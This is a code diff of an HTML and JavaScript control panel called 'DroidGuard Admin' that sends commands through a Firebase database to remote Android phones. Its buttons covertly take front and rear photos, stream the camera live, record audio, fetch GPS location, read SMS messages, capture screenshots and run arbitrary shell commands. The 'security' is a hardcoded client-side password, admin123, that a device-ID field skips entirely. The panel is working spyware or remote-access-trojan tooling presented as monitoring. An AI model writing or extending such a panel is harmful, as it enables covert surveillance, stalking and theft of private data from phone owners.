@@ -1,149 +1,267 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>DroidGuard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DroidGuard Admin</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
     <style>
-        body { background: #0a0c0f; color: #eef2ff; font-family: monospace; padding: 20px; }
-        button { background: #2f8e8b; padding: 12px 24px; margin: 8px; border: none; color: white; border-radius: 8px; cursor: pointer; font-size: 14px; }
-        button:hover { background: #3fa39f; transform: scale(1.02); }
-        .card { background: #0f1219; border-radius: 16px; padding: 20px; margin-bottom: 20px; border: 1px solid #1e2a36; }
-        pre { background: #1a1f2a; padding: 15px; border-radius: 8px; overflow: auto; max-height: 300px; }
-        .online { color: #2ecc71; }
-        select, input { background: #1e2a36; border: none; padding: 10px; border-radius: 8px; color: white; margin: 5px; }
-        .result-img { max-width: 100%; border-radius: 8px; margin-top: 10px; }
-        audio { width: 100%; margin-top: 10px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0c0f; font-family: 'Segoe UI', sans-serif; color: #eef2ff; padding: 20px; }
+        .container { max-width: 1400px; margin: 0 auto; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .login-box, .dashboard { background: #0f1219; border-radius: 20px; padding: 30px; border: 1px solid #1e2a36; }
+        input { background: #1e2a36; border: none; padding: 12px; border-radius: 8px; color: white; margin: 10px 0; width: 100%; }
+        button { background: #2f8e8b; border: none; padding: 12px 24px; border-radius: 8px; color: white; cursor: pointer; margin: 5px; }
+        button:hover { background: #3fa39f; }
+        .device-card { background: #1a1f2a; border-radius: 12px; padding: 15px; margin-bottom: 15px; cursor: pointer; transition: 0.2s; }
+        .device-card:hover { background: #252a35; }
+        .device-online { border-left: 4px solid #2ecc71; }
+        .device-offline { border-left: 4px solid #e74c3c; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
+        .cam-preview { width: 100%; border-radius: 8px; margin-top: 10px; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; padding: 20px; overflow: auto; }
+        .modal-content { background: #0f1219; border-radius: 20px; max-width: 800px; margin: 20px auto; padding: 20px; }
+        .close { float: right; font-size: 28px; cursor: pointer; }
+        .btn-danger { background: #9b2c2c; }
+        .btn-danger:hover { background: #c0392b; }
+        .stream-frame { width: 100%; border-radius: 8px; }
+        .bateria { font-size: 12px; color: #7f8c8d; }
     </style>
 </head>
 <body>
-    <h1>🛡️ DroidGuard</h1>
-    
-    <div class="card">
-        <h3>📱 Dispositivo</h3>
-        <select id="deviceSelect" onchange="selectDevice()">
-            <option value="">Carregando...</option>
-        </select>
-        <button onclick="refreshDevices()">🔄 Atualizar</button>
-        <span id="deviceStatus"></span>
+<div class="container">
+    <div class="header">
+        <h1>🛡️ DroidGuard Admin</h1>
+        <p>Sistema de Monitoramento Remoto</p>
     </div>
 
-    <div class="card">
-        <h3>📸 Comandos</h3>
-        <button onclick="sendCmd('bateria')">🔋 Bateria</button>
-        <button onclick="sendCmd('vibrar')">📳 Vibrar</button>
-        <button onclick="sendCmd('gps')">📍 GPS</button>
-        <button onclick="sendCmd('foto_frontal')">📷 Foto Frontal</button>
-        <button onclick="sendCmd('foto_traseria')">📷 Foto Traseira</button>
-        <button onclick="sendCmd('screenshot')">📸 Screenshot</button>
-        <button onclick="sendCmd('gravar_audio', {duracao:5})">🎤 Áudio 5s</button>
-        <button onclick="sendCmd('listar_sms')">📨 SMS</button>
-        <button onclick="abrirFalar()">🗣️ Falar</button>
+    <!-- Login -->
+    <div id="loginPanel" class="login-box">
+        <h2>🔐 Acesso ao Sistema</h2>
+        <input type="password" id="senhaAdmin" placeholder="Digite a senha de administrador">
+        <button onclick="login()">Entrar</button>
+        <p style="margin-top: 15px; color: #7f8c8d;">Digite o ID do dispositivo para monitorar:</p>
+        <input type="text" id="deviceIdInput" placeholder="ID do dispositivo (ex: a1b2c3d4)">
+        <button onclick="conectarPorId()">Conectar</button>
     </div>
 
-    <div class="card">
-        <h3>💻 Shell Remoto</h3>
-        <input type="text" id="shellCmd" placeholder="Comando..." style="width: 70%;">
-        <button onclick="execShell()">Executar</button>
-    </div>
+    <!-- Dashboard -->
+    <div id="dashboardPanel" style="display:none;">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap;">
+            <h2>📱 Dispositivo: <span id="currentDeviceId">-</span></h2>
+            <div>
+                <button onclick="logout()">🔓 Sair</button>
+                <button onclick="refreshDevice()">🔄 Atualizar</button>
+            </div>
+        </div>
+        
+        <div class="grid">
+            <div class="device-card device-online">
+                <h3>📸 Câmeras</h3>
+                <button onclick="sendCmd('foto_frontal')">📷 Foto Frontal</button>
+                <button onclick="sendCmd('foto_traseria')">📷 Foto Traseira</button>
+                <button onclick="iniciarStream('front')">🎥 Stream Frontal</button>
+                <button onclick="iniciarStream('rear')">🎥 Stream Traseira</button>
+                <div id="fotoResult"></div>
+            </div>
 
-    <div class="card">
-        <h3>📋 Resultado</h3>
-        <pre id="resultado">Aguardando comandos...</pre>
-    </div>
+            <div class="device-card device-online">
+                <h3>🎤 Áudio</h3>
+                <button onclick="sendCmd('gravar_audio', {duracao:5})">🎙️ Gravar 5s</button>
+                <button onclick="sendCmd('gravar_audio', {duracao:10})">🎙️ Gravar 10s</button>
+                <button onclick="sendCmd('gravar_audio', {duracao:30})">🎙️ Gravar 30s</button>
+                <div id="audioResult"></div>
+            </div>
 
-    <div id="modalFalar" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:#1a1f2a; padding:30px; border-radius:16px;">
-        <h3>🗣️ Falar</h3>
-        <input type="text" id="textoFalar" style="width:100%;">
+            <div class="device-card device-online">
+                <h3>📍 Localização</h3>
+                <button onclick="sendCmd('gps')">📍 Pegar GPS</button>
+                <div id="gpsResult"></div>
+            </div>
+
+            <div class="device-card device-online">
+                <h3>📱 Informações</h3>
+                <button onclick="sendCmd('bateria')">🔋 Bateria</button>
+                <button onclick="sendCmd('vibrar')">📳 Vibrar</button>
+                <button onclick="sendCmd('screenshot')">📸 Screenshot</button>
+                <button onclick="abrirFalar()">🗣️ Falar</button>
+                <div id="infoResult"></div>
+            </div>
+
+            <div class="device-card device-online">
+                <h3>💬 Mensagens</h3>
+                <button onclick="sendCmd('listar_sms')">📨 Listar SMS</button>
+                <div id="smsResult" style="max-height: 200px; overflow: auto;"></div>
+            </div>
+
+            <div class="device-card device-online">
+                <h3>💻 Shell Remoto</h3>
+                <input type="text" id="shellCmd" placeholder="Comando..." style="width: 100%;">
+                <button onclick="execShell()">Executar</button>
+                <pre id="shellResult" style="background:#000; padding:10px; border-radius:8px; margin-top:10px; font-size:11px; max-height:150px; overflow:auto;"></pre>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal Stream -->
+<div id="streamModal" class="modal">
+    <div class="modal-content">
+        <span class="close" onclick="fecharStream()">&times;</span>
+        <h3>🎥 Stream ao Vivo</h3>
+        <img id="streamFrame" class="stream-frame" src="">
+        <div style="margin-top: 15px;">
+            <button onclick="pararStream()">⏹️ Parar Stream</button>
+            <span id="streamStatus">Conectando...</span>
+        </div>
+    </div>
+</div>
+
+<!-- Modal Falar -->
+<div id="falarModal" class="modal">
+    <div class="modal-content">
+        <span class="close" onclick="fecharFalar()">&times;</span>
+        <h3>🗣️ Falar no Dispositivo</h3>
+        <input type="text" id="textoFalar" placeholder="Digite o texto..." style="width: 100%;">
         <button onclick="sendCmd('falar', {texto: document.getElementById('textoFalar').value}); fecharFalar()">Enviar</button>
-        <button onclick="fecharFalar()">Cancelar</button>
     </div>
+</div>
 
-    <script>
-        let currentDevice = null;
-        let autoRefresh = null;
-
-        const firebaseConfig = { databaseURL: "https://droidguard-10597-default-rtdb.firebaseio.com/" };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-
-        function refreshDevices() {
-            db.ref('dispositivos').once('value', (snap) => {
-                const devices = snap.val() || {};
-                const select = document.getElementById('deviceSelect');
-                select.innerHTML = '<option value="">Selecione...</option>';
-                for(let id in devices) {
-                    const d = devices[id];
-                    const status = d.status === 'online' ? '🟢' : '🔴';
-                    select.innerHTML += `<option value="${id}">${status} ${id}</option>`;
-                }
-                
-                // Se tem dispositivo e nenhum selecionado, auto-seleciona
-                if(!currentDevice && Object.keys(devices).length > 0) {
-                    currentDevice = Object.keys(devices)[0];
-                    select.value = currentDevice;
-                    selectDevice();
+<script>
+    const firebaseConfig = { databaseURL: "https://droidguard-10597-default-rtdb.firebaseio.com/" };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    
+    let currentDevice = null;
+    let streamInterval = null;
+    let adminSenha = "admin123"; // Senha padrão
+    
+    function login() {
+        const senha = document.getElementById('senhaAdmin').value;
+        if(senha === adminSenha) {
+            document.getElementById('loginPanel').style.display = 'none';
+            document.getElementById('dashboardPanel').style.display = 'block';
+        } else {
+            alert('Senha incorreta!');
+        }
+    }
+    
+    function logout() {
+        document.getElementById('loginPanel').style.display = 'block';
+        document.getElementById('dashboardPanel').style.display = 'none';
+        currentDevice = null;
+        if(streamInterval) clearInterval(streamInterval);
+    }
+    
+    function conectarPorId() {
+        const deviceId = document.getElementById('deviceIdInput').value.trim();
+        if(deviceId) {
+            currentDevice = deviceId;
+            document.getElementById('currentDeviceId').innerHTML = currentDevice;
+            document.getElementById('loginPanel').style.display = 'none';
+            document.getElementById('dashboardPanel').style.display = 'block';
+            
+            // Verificar se existe
+            db.ref(`dispositivos/${currentDevice}`).once('value', (snap) => {
+                if(!snap.exists()) {
+                    alert('⚠️ Dispositivo não encontrado! Verifique o ID.');
                 }
             });
         }
-
-        function selectDevice() {
-            currentDevice = document.getElementById('deviceSelect').value;
-            if(currentDevice) {
-                db.ref(`dispositivos/${currentDevice}`).on('value', (snap) => {
-                    const d = snap.val();
-                    if(d) {
-                        const statusSpan = document.getElementById('deviceStatus');
-                        statusSpan.innerHTML = d.status === 'online' ? '<span class="online">🟢 Online</span>' : '🔴 Offline';
-                    }
-                });
-            }
+    }
+    
+    async function sendCmd(acao, params = {}) {
+        if(!currentDevice) {
+            alert('Conecte a um dispositivo primeiro!');
+            return;
         }
-
-        async function sendCmd(acao, params = {}) {
-            if(!currentDevice) {
-                document.getElementById('resultado').innerText = '❌ Selecione um dispositivo primeiro!';
-                refreshDevices();
-                return;
-            }
-            
-            const cmdId = Date.now().toString();
-            document.getElementById('resultado').innerText = `🔄 Enviando ${acao}...`;
-            
-            await db.ref(`comandos/${currentDevice}/${cmdId}`).set({ acao, params, timestamp: Date.now() });
-            
-            const resultRef = db.ref(`resultados/${currentDevice}/${cmdId}`);
-            resultRef.once('value', (snap) => {
-                const res = snap.val();
-                if(res) {
-                    if(res.foto) {
-                        document.getElementById('resultado').innerHTML = `<img src="data:image/jpeg;base64,${res.foto}" class="result-img">`;
-                    } else if(res.screen) {
-                        document.getElementById('resultado').innerHTML = `<img src="data:image/png;base64,${res.screen}" class="result-img">`;
-                    } else if(res.audio) {
-                        document.getElementById('resultado').innerHTML = `<audio controls src="data:audio/aac;base64,${res.audio}"></audio>`;
-                    } else {
-                        document.getElementById('resultado').innerText = JSON.stringify(res, null, 2);
-                    }
+        
+        const cmdId = Date.now().toString();
+        await db.ref(`comandos/${currentDevice}/${cmdId}`).set({ acao, params, timestamp: Date.now() });
+        
+        const resultRef = db.ref(`resultados/${currentDevice}/${cmdId}`);
+        resultRef.once('value', (snap) => {
+            const res = snap.val();
+            if(res) {
+                if(res.foto) {
+                    document.getElementById('fotoResult').innerHTML = `<img src="data:image/jpeg;base64,${res.foto}" class="cam-preview">`;
+                } else if(res.screen) {
+                    document.getElementById('fotoResult').innerHTML = `<img src="data:image/png;base64,${res.screen}" class="cam-preview">`;
+                } else if(res.audio) {
+                    document.getElementById('audioResult').innerHTML = `<audio controls src="data:audio/aac;base64,${res.audio}"></audio>`;
+                } else if(res.latitude) {
+                    document.getElementById('gpsResult').innerHTML = `
+                        📍 ${res.latitude}, ${res.longitude}<br>
+                        <iframe width="100%" height="200" src="https://maps.google.com/maps?q=${res.latitude},${res.longitude}&output=embed"></iframe>
+                    `;
+                } else if(res.sms) {
+                    let html = '';
+                    res.sms.forEach(s => {
+                        html += `<p><strong>${s.numero}</strong><br>${s.texto}<br><small>${s.data}</small></p><hr>`;
+                    });
+                    document.getElementById('smsResult').innerHTML = html;
+                } else if(res.percentage !== undefined) {
+                    document.getElementById('infoResult').innerHTML = `🔋 Bateria: ${res.percentage}%`;
+                } else if(res.stdout !== undefined) {
+                    document.getElementById('shellResult').innerText = res.stdout || res.stderr;
                 } else {
-                    document.getElementById('resultado').innerText = '⏳ Aguardando resposta do dispositivo...';
+                    document.getElementById('infoResult').innerHTML = JSON.stringify(res);
                 }
-            });
-            
-            setTimeout(() => resultRef.off(), 20000);
-        }
-
-        function execShell() {
-            const cmd = document.getElementById('shellCmd').value;
-            if(cmd) sendCmd('shell', { cmd: cmd });
-        }
-
-        function abrirFalar() { document.getElementById('modalFalar').style.display = 'block'; }
-        function fecharFalar() { document.getElementById('modalFalar').style.display = 'none'; }
-
-        refreshDevices();
-        setInterval(refreshDevices, 5000);
-    </script>
+            }
+        });
+        setTimeout(() => resultRef.off(), 15000);
+    }
+    
+    function execShell() {
+        const cmd = document.getElementById('shellCmd').value;
+        if(cmd) sendCmd('shell', { cmd: cmd });
+    }
+    
+    function refreshDevice() {
+        sendCmd('ping');
+        sendCmd('bateria');
+    }
+    
+    function iniciarStream(tipo) {
+        sendCmd('start_stream', { tipo: tipo, duracao: 60 });
+        document.getElementById('streamModal').style.display = 'block';
+        document.getElementById('streamStatus').innerHTML = 'Iniciando stream...';
+        
+        streamInterval = setInterval(() => {
+            fetchStreamFrame();
+        }, 1000);
+    }
+    
+    async function fetchStreamFrame() {
+        const cmdId = Date.now().toString();
+        await db.ref(`comandos/${currentDevice}/${cmdId}`).set({ acao: 'get_stream_frame', timestamp: Date.now() });
+        
+        const resultRef = db.ref(`resultados/${currentDevice}/${cmdId}`);
+        resultRef.once('value', (snap) => {
+            const res = snap.val();
+            if(res && res.frame) {
+                document.getElementById('streamFrame').src = `data:image/jpeg;base64,${res.frame}`;
+                document.getElementById('streamStatus').innerHTML = '📡 Stream ativo';
+            }
+        });
+        setTimeout(() => resultRef.off(), 2000);
+    }
+    
+    function pararStream() {
+        sendCmd('stop_stream');
+        if(streamInterval) clearInterval(streamInterval);
+        fecharStream();
+    }
+    
+    function fecharStream() {
+        document.getElementById('streamModal').style.display = 'none';
+        if(streamInterval) clearInterval(streamInterval);
+    }
+    
+    function abrirFalar() { document.getElementById('falarModal').style.display = 'block'; }
+    function fecharFalar() { document.getElementById('falarModal').style.display = 'none'; }
+</script>
 </body>
 </html>
